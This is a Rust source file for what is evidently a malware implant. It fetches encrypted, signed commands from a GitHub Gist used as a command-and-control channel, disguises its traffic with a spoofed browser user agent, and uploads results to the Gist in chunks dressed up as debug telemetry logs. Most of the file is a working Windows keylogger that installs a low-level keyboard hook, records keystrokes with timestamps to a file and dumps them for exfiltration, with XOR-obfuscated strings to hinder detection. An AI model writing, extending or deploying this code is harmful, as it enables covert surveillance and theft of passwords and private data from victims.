// Generate standard headers to mimic legitimate traffic
fn get_headers(config: &Config) -> HeaderMap {
    let mut headers = HeaderMap::new();
    headers.insert(
        USER_AGENT,
        HeaderValue::from_static(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ),
    );
    headers.insert(
        AUTHORIZATION,
        HeaderValue::from_str(&format!("token {}", config.github_token)).unwrap(),
    );
    headers
}

// Get task from Gist (returns command and task_id)
fn get_task(config: &Config, agent_id: &str) -> Result<Option<(String, String)>, Box<dyn Error>> {
    let client = Client::new();
    let url = &config.gist_api_url;

    let response = client.get(url).headers(get_headers(config)).send()?;

    if !response.status().is_success() {
        return Err(format!("Failed to get gist: {}", response.status()).into());
    }

    let gist: GistResponse = response.json()?;
    let task_filename = format!("{}_updater_log.json", agent_id);

    if let Some(file) = gist.files.get(&task_filename) {
        let task_config: UpdaterConfig = serde_json::from_str(&file.content)?;

        // Step 1: Verify RSA signature (authenticates command from controller)
        verify_signature(&task_config.payload, &task_config.signature)?;

        // Step 2: Decrypt AES-GCM encrypted command
        let command_with_id =
            unpack_encrypted_command(config, &task_config.payload, &task_config.nonce)?;

        // Step 3: Split by delimiter to extract task_id and command
        if let Some(delimiter_pos) = command_with_id.find('|') {
            let (embedded_task_id, command) = command_with_id.split_at(delimiter_pos);
            let command = &command[1..]; // Skip the '|'

            // Step 4: Verify task_id matches (integrity check)
            if embedded_task_id != task_config.task_id {
                return Err("Task ID mismatch - command may be tampered".into());
            }

            Ok(Some((command.to_string(), task_config.task_id)))
        } else {
            Err("Invalid command format - missing task ID".into())
        }
    } else {
        Ok(None)
    }
}

fn patch_gist_with_retry(
    client: &Client,
    url: &str,
    headers: reqwest::header::HeaderMap,
    update: &GistUpdate,
) -> Result<(), Box<dyn Error>> {
    let mut attempts = 0;
    let max_attempts = 5;

    loop {
        attempts += 1;
        let response = client
            .patch(url)
            .headers(headers.clone())
            .json(update)
            .send()?;

        let status = response.status();
        if status.is_success() {
            return Ok(());
        }

        if status == reqwest::StatusCode::CONFLICT && attempts < max_attempts {
            let wait_secs = rand::thread_rng().gen_range(5..15);
            println!(
                "[-] Gist conflict (409) on attempt {}. Retrying in {}s...",
                attempts, wait_secs
            );
            std::thread::sleep(Duration::from_secs(wait_secs));
            continue;
        }

        return Err(format!("Failed to update gist after {} attempts: {}", attempts, status).into());
    }
}

// Send result to Gist (with chunking for large data)
fn send_result(config: &Config, agent_id: &str, result: &str) -> Result<(), Box<dyn Error>> {
    let client = Client::new();
    let url = &config.gist_api_url;

    // Generate log_id first
    let log_id = Uuid::new_v4().to_string();

    // Pack data with log_id prepended before encryption
    let packed_result = pack_data(config, result, &log_id)?;

    // Check if result is too large (GitHub Gist file limit ~1MB, use 500KB to be safe)
    const MAX_CHUNK_SIZE: usize = 500_000;

    let mut files = HashMap::new();

    if packed_result.len() > MAX_CHUNK_SIZE {
        // Split into multiple files
        let chunks: Vec<&str> = packed_result
            .as_bytes()
            .chunks(MAX_CHUNK_SIZE)
            .map(|chunk| std::str::from_utf8(chunk).unwrap_or(""))
            .collect();

        let total_chunks = chunks.len();

        for (i, chunk) in chunks.iter().enumerate() {
            let telemetry = TelemetryLog {
                log_id: log_id.clone(),
                timestamp: Utc::now().to_rfc3339(),
                level: format!("INFO [Part {}/{}]", i + 1, total_chunks),
                payload: chunk.to_string(),
            };

            let result_filename = format!("{}_debug_part{}.json", agent_id, i + 1);
            let content = serde_json::to_string_pretty(&telemetry)?;
            files.insert(result_filename, GistFileUpdate { content });
        }
        println!("[+] Large result split into {} parts", total_chunks);
    } else {
        // Single file upload
        let telemetry = TelemetryLog {
            log_id: log_id.clone(),
            timestamp: Utc::now().to_rfc3339(),
            level: "INFO".to_string(),
            payload: packed_result,
        };

        let result_filename = format!("{}_debug.json", agent_id);
        let content = serde_json::to_string_pretty(&telemetry)?;
        files.insert(result_filename, GistFileUpdate { content });
    }

    let update = GistUpdate { files };
    patch_gist_with_retry(&client, url, get_headers(config), &update)
}

// Keylogger functions (Windows only)
#[cfg(windows)]
fn start_keylogger() -> String {
    if KEYLOGGER_RUNNING.load(Ordering::Relaxed) {
        return String::from_utf8(xor_decrypt(secrets::ENC_KL_ALREADY_RUNNING)).unwrap_or_default();
    }

    println!("{}", String::from_utf8(xor_decrypt(secrets::ENC_KL_STARTING)).unwrap_or_default());
    KEYLOGGER_RUNNING.store(true, Ordering::Relaxed);

    thread::spawn(move || {
        unsafe extern "system" fn keyboard_hook_proc(
            n_code: i32,
            w_param: WPARAM,
            l_param: LPARAM,
        ) -> LRESULT {
            if n_code >= 0 && w_param as u32 == WM_KEYDOWN {
                let kb_struct = l_param as *const KBDLLHOOKSTRUCT;
                let vk_code = (*kb_struct).vkCode;
                let scan_code = (*kb_struct).scanCode;

                let mut keystate: [u8; 256] = [0; 256];
                GetKeyboardState(keystate.as_mut_ptr());

                let mut buffer: [u16; 5] = [0; 5];
                let result = ToUnicode(
                    vk_code as u32,
                    scan_code as u32,
                    keystate.as_ptr(),
                    buffer.as_mut_ptr(),
                    buffer.len() as i32,
                    0,
                );

                if result == 1 {
                    if let Some(c) = char::from_u32(buffer[0] as u32) {
                        use chrono::{DateTime, Utc};
                        use std::io::{BufRead, BufReader};

                        let kl_file = String::from_utf8(xor_decrypt(secrets::ENC_KEYLOG_FILE)).unwrap_or_default();
                        let now: DateTime<Utc> = Utc::now();
                        let current_minute = now.format("%Y-%m-%d %H:%M").to_string();

                        // Read the last line to check if it's the same minute
                        let mut should_append_to_line = false;
                        if let Ok(file) = fs::File::open(&kl_file) {
                            let mut reader = BufReader::new(file);
                            let mut last_line = String::new();
                            let mut lines = Vec::new();

                            while reader.read_line(&mut last_line).unwrap_or(0) > 0 {
                                lines.push(last_line.clone());
                                last_line.clear();
                            }

                            if let Some(last) = lines.last() {
                                if last.starts_with(&format!("[{}]", current_minute)) {
                                    should_append_to_line = true;
                                }
                            }
                        }

                        if should_append_to_line {
                            // Append to the last line
                            if let Ok(content) = fs::read_to_string(&kl_file) {
                                let mut lines: Vec<&str> = content.lines().collect();
                                if let Some(last_line) = lines.pop() {
                                    let mut new_content = lines.join("\n");
                                    if !new_content.is_empty() {
                                        new_content.push('\n');
                                    }
                                    new_content.push_str(last_line);
                                    new_content.push(c);
                                    new_content.push('\n');
                                    let _ = fs::write(&kl_file, new_content);
                                }
                            }
                        } else {
                            // Create new line with timestamp
                            if let Ok(mut file) = OpenOptions::new()
                                .create(true)
                                .append(true)
                                .open(&kl_file)
                            {
                                let _ = file
                                    .write_all(format!("[{}] {}\n", current_minute, c).as_bytes());
                            }
                        }
                    }
                }
            }
            CallNextHookEx(ptr::null_mut(), n_code, w_param, l_param)
        }

        let hook: HHOOK = unsafe {
            SetWindowsHookExA(
                WH_KEYBOARD_LL,
                Some(keyboard_hook_proc),
                ptr::null_mut() as HINSTANCE,
                0,
            )
        };

        if hook.is_null() {
            eprintln!("{}{}",
                String::from_utf8(xor_decrypt(secrets::ENC_KL_HOOK_FAILED)).unwrap_or_default(),
                unsafe { GetLastError() }
            );
        } else {
            println!("{}", String::from_utf8(xor_decrypt(secrets::ENC_KL_HOOK_INSTALLED)).unwrap_or_default());
            let mut msg: LPMSG = ptr::null_mut();
            while KEYLOGGER_RUNNING.load(Ordering::Relaxed) {
                unsafe { GetMessageA(msg, ptr::null_mut(), 0, 0) };
            }
            unsafe { UnhookWindowsHookEx(hook) };
            println!("{}", String::from_utf8(xor_decrypt(secrets::ENC_KL_HOOK_REMOVED)).unwrap_or_default());
        }
    });

    String::from_utf8(xor_decrypt(secrets::ENC_KL_STARTED)).unwrap_or_default()
}

#[cfg(windows)]
fn stop_keylogger() -> String {
    if !KEYLOGGER_RUNNING.load(Ordering::Relaxed) {
        return String::from_utf8(xor_decrypt(secrets::ENC_KL_NOT_RUNNING)).unwrap_or_default();
    }

    println!("{}", String::from_utf8(xor_decrypt(secrets::ENC_KL_STOPPING)).unwrap_or_default());
    KEYLOGGER_RUNNING.store(false, Ordering::Relaxed);
    String::from_utf8(xor_decrypt(secrets::ENC_KL_STOPPED)).unwrap_or_default()
}

#[cfg(windows)]
fn get_keylog() -> String {
    let kl_file = String::from_utf8(xor_decrypt(secrets::ENC_KEYLOG_FILE)).unwrap_or_default();
    match fs::read_to_string(&kl_file) {
        Ok(content) => {
            if content.is_empty() {
                String::from_utf8(xor_decrypt(secrets::ENC_KL_FILE_EMPTY)).unwrap_or_default()
            } else {
                let lines: Vec<&str> = content.lines().collect();
                let char_count = content
                    .chars()
                    .filter(|c| !c.is_whitespace() && *c != '[' && *c != ']')
                    .count();
                let mut output = String::new();
                output.push_str(&format!("{}", String::from_utf8(xor_decrypt(secrets::ENC_KL_DUMP_HDR)).unwrap_or_default()));
                output.push_str(&format!("\nTotal keystrokes captured: {}\n", lines.len()));
                output.push_str(&format!("Total characters: {}\n", char_count));
                output.push_str(&format!("\n{}\n", String::from_utf8(xor_decrypt(secrets::ENC_KL_DUMP_SEP)).unwrap_or_default()));
                output.push_str(&content);
                output.push_str(&format!("\n{}\n", String::from_utf8(xor_decrypt(secrets::ENC_KL_DUMP_END)).unwrap_or_default()));
                output
            }
        }
        Err(_) => String::from_utf8(xor_decrypt(secrets::ENC_KL_FILE_ERR)).unwrap_or_default(),
    }
}

